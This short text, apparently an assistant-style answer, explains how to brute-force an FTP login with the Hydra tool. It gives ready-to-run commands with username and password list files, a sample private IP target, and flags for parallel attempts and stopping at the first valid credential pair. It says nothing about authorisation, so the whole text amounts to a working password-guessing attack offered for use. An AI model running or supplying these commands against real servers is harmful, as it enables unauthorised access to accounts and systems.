To brute-force an FTP login using Hydra, you can use the following command:

```
hydra -L userlist.txt -P passlist.txt ftp://TARGET_IP
```

### Breakdown:

- `-L userlist.txt`: Path to a file containing **usernames** (one per line).

- `-P passlist.txt`: Path to a file containing **passwords** (one per line).

- `ftp://TARGET_IP`: Replace `TARGET_IP` with the actual IP address or domain of the FTP server.


### Example:

```
hydra -L users.txt -P passwords.txt ftp://192.168.1.10
```

### Optional flags:

- `-vV`: Show verbose output and every attempt.

- `-t 4`: Set the number of parallel tasks (default is 16, reduce if the server is slow or unstable).

- `-f`: Exit after finding the first valid login pair.


Example with additional options:

```
hydra -L users.txt -P passwords.txt -vV -t 4 -f ftp://192.168.1.10
```
